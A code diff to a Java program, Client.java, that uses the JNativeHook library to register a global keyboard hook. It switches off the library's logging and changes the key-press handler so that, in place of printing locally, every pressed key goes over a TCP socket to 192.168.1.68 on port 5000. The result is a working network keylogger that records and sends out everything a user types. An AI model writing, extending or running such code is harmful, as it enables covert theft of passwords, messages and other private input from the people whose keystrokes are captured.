@@ -3,13 +3,19 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.*;
 
+import java.io.IOException;
+import java.io.PrintWriter;
+import java.net.Socket;
 import java.util.logging.Handler;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
 
 public class Client implements NativeKeyListener {
-    public static void main(String[] args) {
+    Socket client;
+    PrintWriter writer;
+
+    public static void main(String[] args) throws IOException {
         try {
             GlobalScreen.registerNativeHook();// позволяет обнаружить нажатие клавиши
         }
@@ -24,22 +30,29 @@ public class Client implements NativeKeyListener {
         for (int i = 0; i < handlers.length; i++) {
             handlers[i].setLevel(Level.OFF);
         }
-        GlobalScreen.addNativeKeyListener(new Client());
+        Client localClient = new Client();
+        localClient.go();
+        GlobalScreen.addNativeKeyListener(localClient);
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent arg0) {
-
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
-        System.out.println("Pressed " + NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase());
+        String data = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();
+        writer.println(data);
+        writer.flush();
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
-        //System.out.println("Released " + NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase());
+    }
+
+    public void go() throws IOException {
+        client = new Socket("192.168.1.68", 5000);
+        writer = new PrintWriter(client.getOutputStream());
     }
 }
 
